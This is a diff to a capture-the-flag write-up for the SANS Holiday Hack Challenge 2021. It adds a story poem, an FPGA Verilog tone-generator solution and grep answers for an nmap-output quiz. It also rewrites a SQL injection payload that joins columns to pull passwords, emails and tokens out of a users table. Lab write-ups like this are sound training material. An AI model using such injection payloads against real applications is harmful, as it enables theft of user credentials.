@@ -1,6 +1,48 @@
 # [KringleCon 4: Calling Birds](https://2021.kringlecon.com/)
 *SANS Holiday Hack Challenge 2021*
 
+<blockquote>
+Listen children to a story that was written in the cold
+
+'Bout a Kringle and his castle hosting hackers, meek and bold
+
+Then from somewhere came another, built his tower tall and proud
+
+Surely he, our Frosty villain hides intentions 'neath a shroud
+
+So begins Jack's reckless mission: gather trolls to win a war
+
+Build a con that's fresh and shiny, has this yet been done before?
+
+Is his Fest more feint than folly? Some have noticed subtle clues
+
+Running 'round and raiding repos, stealing Santa's Don'ts and Do's
+
+Misdirected, scheming, grasping, Frost intends to seize the day
+
+Funding research with a gift shop, can Frost build the better sleigh?
+
+Lo, we find unlikely allies: trolls within Jack's own command
+
+Doubting Frost and searching motive, questioning his dark demand
+
+Is our Jack just lost and rotten - one more outlaw stomping toes?
+
+Why then must we piece together cludgy, wacky radios?
+
+With this object from the heavens, Frost must know his cover's blown
+
+Hearkening from distant planet! We the heroes should have known
+
+Go ahead and hack your neighbor, go ahead and phish a friend
+
+Do it in the name of holidays, you can justify it at year's end
+
+There won't be any retweets praising you, come disclosure day
+
+But on the snowy evening after? Still Kris Kringle rides the sleigh
+</blockquote>
+
 ## Main Objectives
 
 ### 1. KringleCon Orientation
@@ -1939,7 +1981,16 @@ CREATE TABLE `emails` (
 
 Adding the following runs a query on the server to add data from the `users` table to the result. We can't use commas in the injection because they will be split apart by the JavaScript code, so we have to use joins:
 ```sql
-0 UNION ALL SELECT * FROM (SELECT id FROM users LIMIT 10) f1 JOIN (SELECT password FROM users LIMIT 10) f2 ON f1.id = f2.password OR 1=1 JOIN (SELECT email FROM users LIMIT 10) f3 ON f1.id = f3.email OR 1=1 JOIN (SELECT user_status FROM users LIMIT 10) f4 ON f1.id = f4.user_status OR 1=1 JOIN (SELECT token FROM users LIMIT 10) f5 ON f1.id = f5.token OR 1=1 JOIN (SELECT date_created FROM users LIMIT 10) f6 ON f1.id = f6.date_created OR 1=1 JOIN (SELECT date_created FROM users LIMIT 10) f7 ON f1.id = f7.date_created OR 1=1;--
+0
+UNION ALL
+SELECT *
+FROM (SELECT id FROM users) f1 
+JOIN (SELECT password FROM users) f2 ON 1=1 
+JOIN (SELECT email FROM users) f3 ON 1=1 
+JOIN (SELECT user_status FROM users) f4 ON 1=1
+JOIN (SELECT token FROM users) f5 ON 1=1
+JOIN (SELECT date_created FROM users) f6 ON 1=1
+JOIN (SELECT date_created FROM users) f7 ON 1=1;--
 ```
 
 Submit this to the endpoint:
@@ -1981,7 +2032,126 @@ The answer is `clerk`:
 Write your first FPGA program to make a doll sing. You might get some suggestions from Grody Goiterson, near Jack's elevator.
 
 #### Solution
-(JF Tower roof)
+
+##### EE/CS 302: FPGA Design for Embedded Systems
+>Day 4 &ndash; Introduction to Verilog
+
+>Hello, students! In exercise #4, we continue our FPGA journey, documenting the creation of the sound chip for this holiday season's new Kurse 'em Out Karen doll. Our goal is to make the doll say its trademark phrase ("Let me talk to your manager!"). But, as I always tell you in class, we must walk before we run.
+
+>Before the doll can say anything, we must first have it make noise. In this exercise you will design an FPGA module that creates a square wave tone at a variable frequency.
+
+>Creating a square wave output takes our clock signal (which is also a square wave) and uses a counter to divide the clock to match the desired frequency. One tricky problem that we'll encounter is that Verilog (v1364-2005) doesn't have a built-in mechanism to round real numbers to integers, so you'll need to devise a means to do that correctly if you want your module to match frequencies accurately.
+
+>Good luck and always remember:
+
+>If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1
+
+Start by watching [this talk](https://www.youtube.com/watch?v=GFdG1PJ4QjA&list=PLjLd1hNA7YVx99qJF3OoPF-qunjqw-SoU&index=4) to learn the concepts:
+
+![FPGA intro](./fpga_intro.png)
+
+Verilog is not a programming language it's a **Hardware Description Language (HDL)**:
+
+![concepts](./hdl.png)
+
+Here's an example for the functionality of blinking an LED light:
+
+![Verilog example](./verilog_example.png)
+
+Some important HDL concepts from that example:
+
+![HDL concepts for "blink" module](./module_concepts.png)
+
+The outcome of the FPGA is actually this:
+
+![logic gates](./logic_gates.png)
+
+Now, for the task:
+
+![assignment 4](./assignment_4.png)
+
+Some hints from Professor Qwerty Petabyte:
+
+![FPGA assignment 4 hints](./fpga_hints.png)
+
+```
+Console
+
+Exercise #4 Objective: Students must prove their design before being allowed to program an actual device. The student's model must produce a 500Hz, 1KHz, and 2KHz square wave accurately AND accurately produce a square wave of a randomly chosen frequency. This tool will run the model under simulation, passing it the appropriate register values and measuring the frequency of the resulting square wave.
+
+Important: Students MUST perform all simulation tests with the SAME code. If the code is changed, all tests will need to be re-run.
+
+                                          - Prof. Qwerty Petabyte 
+```
+
+The example provided uses a 100MHz clock, so we have to adjust to the 125MHz clock and allow for custom frequencies of sounds. What we have to keep in mind is that the clock frequency represents the number of cycles per second. We need to translate the desired frequency to the clock's frequency and divide up the cycle accordingly (and handle any rounding issues along the way):
+```
+// Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA.
+// The CQC-11 operates with a 125MHz clock.
+// Your design for a tone generator must support the following 
+// inputs/outputs:
+// (NOTE: DO NOT CHANGE THE NAMES. OUR AUTOMATED GRADING TOOL
+// REQUIRES THE USE OF THESE NAMES!)
+// input clk - this will be connected to the 125MHz system clock
+// input rst - this will be connected to the system board's reset bus
+// input freq - a 32 bit integer indicating the required frequency
+//              (0 - 9999.99Hz) formatted as follows:
+//              32'hf1206 or 32'd987654 = 9876.54Hz
+// output wave_out - a square wave output of the desired frequency
+// you can create whatever other variables you need, but remember
+// to initialize them to something!
+
+`timescale 1ns/1ns
+module tone_generator (
+    input clk,
+    input rst,
+    input [31:0] freq,
+    output wave_out
+);
+    // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- 
+    // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ----
+    reg [31:0] counter;
+    real cycles = 125 * 1e6;
+    real target_freq = $itor(freq) / 100.0;
+    real clk_on = (cycles / target_freq) / 2.0;
+    reg [31:0] square_wave;
+    reg sound;
+    assign wave_out = sound;
+
+    always @(posedge clk or posedge rst)
+    begin
+        if(rst==1)
+            begin
+                counter <= 0;
+                sound <= 0;
+                if ($rtoi(clk_on * 10) - ($rtoi(clk_on) * 10) > 4)
+                    begin
+                        square_wave <= $rtoi(clk_on) + 1;
+                    end
+                else
+                    square_wave <= $rtoi(clk_on);
+            end
+        else
+            begin
+                if(counter >= square_wave)
+                    begin
+                        counter <= 1;
+                        sound <= sound ^ 1'b1;
+                    end
+                else
+                    counter <= counter + 1;
+            end
+    end
+endmodule
+```
+
+Once this is complete, walk over to the station where the troll Crunchy Squishter is building a device to communicate with the troll's home planet. Click on it, drag the FPGA chip onto the device, and summon the space ship:
+
+![troll space ship](./troll_spaceship.png)
+
+Go into the space ship and talk to everyone there from right to left (otherwise they won't have anything to say). After you talk to the last one (Santa), the credits will roll:
+
+![creditsc](./credits.png)
 
 ## Side Quests
 These are completed at Cranberry Pi terminals throughout the game typically next to elves who introduce the task and can provide hints to the main objectives in exchange for helping them with these.
@@ -2420,8 +2590,67 @@ You incorrectly added 0 benign IPs to the naughty list
 *******************************************************************
 ```
 
-### Grepping for Gold
-(Not sure where this is or how to unlock it...)
+### Greasy GopherGuts - Grepping for Gold
+
+>Howdy howdy!  Mind helping me with this homew- er, challenge?
+Someone ran nmap -oG on a big network and produced this bigscan.gnmap file.
+The quizme program has the questions and hints and, incidentally,
+has NOTHING to do with an Elf University assignment. Thanks!
+
+>What port does 34.76.1.22 have open? 62078
+```shell
+elf@237fac25c530:~$ grep 34.76.1.22 bigscan.gnmap 
+Host: 34.76.1.22 ()     Status: Up
+Host: 34.76.1.22 ()     Ports: 62078/open/tcp//iphone-sync///      Ignored State: closed (999)
+```
+
+>What port does 34.77.207.226 have open? 8080
+```shell
+elf@237fac25c530:~$ grep 34.77.207.226 bigscan.gnmap 
+Host: 34.77.207.226 ()     Status: Up
+Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///      Ignored State: filtered (999)
+```
+
+>How many hosts appear "Up" in the scan?
+```shell
+elf@237fac25c530:~$ grep "Status: Up" bigscan.gnmap  | wc -l
+26054
+```
+
+>How many hosts have a web port open?  (Let's just use TCP ports 80, 443, and 8080)
+```shell
+elf@237fac25c530:~$ egrep "(80|443|8080)/" bigscan.gnmap | cut -d' ' -f 2 | uniq | wc -l
+14372
+```
+
+>How many hosts with status Up have no (detected) open TCP ports?
+```shell
+elf@237fac25c530:~$ cat bigscan.gnmap | grep "Status: Up" -A 1 | cut -d' ' -f 2 | uniq -c | grep "1 " | wc -l
+402
+```
+
+This solutions takes advantage of the fact that the line after (`-A 1`) the "Status: Up" will show open ports, but if nothing is open, it will show the next IP address. Therefore, the IP addresses that are only present once in the result are those without open ports. The challenge provides an alternative solution:
+
+```shell
+echo $((`grep Up bigscan.gnmap | wc -l` - `grep Ports bigscan.gnmap | wc -l`))
+```
+
+>What's the greatest number of TCP ports any one host has open?
+
+```shell
+elf@15f57efaca46:~$ grep -on "/open/" bigscan.gnmap | cut -d':' -f 1 | uniq -c | sort
+12
+```
+
+The above looks for lines with "/open/" in them and outputs the line number (`-n`) and the matching text (`-o`) for each matching occurrence, so if it matches 3 times on a line, that line is added 3 times to the result, which makes it easy to count the results. Some alternatives provided by the game:
+
+```
+We used this as a solution:
+grep -E "(open.*){12,}" bigscan.gnmap | wc -l && grep -E "(open.*){13,}" bigscan.gnmap | wc -l
+In our solution, we count how many lines have "open" in them a number of times.  We get a few for 12 and none for 13.
+One crafty tester employed the mighty powers of awk like this:
+  awk 'BEGIN {print}{print gsub(/open/,"") ""}' bigscan.gnmap | sort -nr | head -1
+```
 
 ### Bonus Challenges - Log4J
 These were added on 12/21/21 at the North Pole location.
